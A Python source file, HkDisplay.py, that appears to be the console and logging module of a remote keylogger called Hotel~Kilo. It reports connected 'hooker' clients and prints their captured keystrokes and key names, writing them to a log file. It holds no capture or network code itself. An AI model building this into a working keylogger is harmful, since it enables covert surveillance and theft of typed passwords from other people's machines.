# ===============================================
# Filename: HkDisplay.py
#    About: Display class for Hotel~Kilo
# ===============================================

import sys
from time import strftime

class HkDisplay():
    fileOuput = False
    fileOutputPath = 'hotel-kilo.log'
    hideShift = True
    previousKeyPress = ''
    keyPressCount = 0
    log = ''
        
    def createLogFile(self):
        self.log = open(self.fileOutputPath, 'a')
        self.log.write('***** BEGIN LOG FILE (%s) *****\n\n' % strftime('%d-%m-%Y %H:%M:%S'))
    
    def newClient(self, address):
        sys.stdout.write('\n[+] Found hooker on: %s\n' % str(address))

    def _printAscii_(self, ascii):
        ''' Prints chars based on ascii value '''
        if len(self.previousKeyPress) > 1:
            sys.stdout.write('\n')
            self.previousKeyPress = ''
        if ascii == 8:
            sys.stdout.write('\b \b')
        elif ascii == 13:
            sys.stdout.write('\n')
        else:
            sys.stdout.write(chr(ascii)), 
        if self.fileOuput:
            self.log.write(chr(ascii))

    def _printKey_(self, message):
        ''' Prints the name of a key (used for non-printable keys) '''
        if self.previousKeyPress != message:
            self.previousKeyPress = message
            self.keyPressCount = 1
            sys.stdout.write('\n[%s] x %d' % (message, self.keyPressCount)), 
        else:
            sys.stdout.write('\b' * len(str(self.keyPressCount))), 
            self.keyPressCount += 1
            sys.stdout.write('%d' % self.keyPressCount), 
        if self.fileOuput:
            self.log.write(message)

    def printMessage(self, message):
        ''' Record a message from a client to file / stdout '''
        try:
            ascii = int(message)
            self._printAscii_(ascii)
        except:
            if 'shift' in message and self.hideShift:
                return
            self._printKey_(message)
                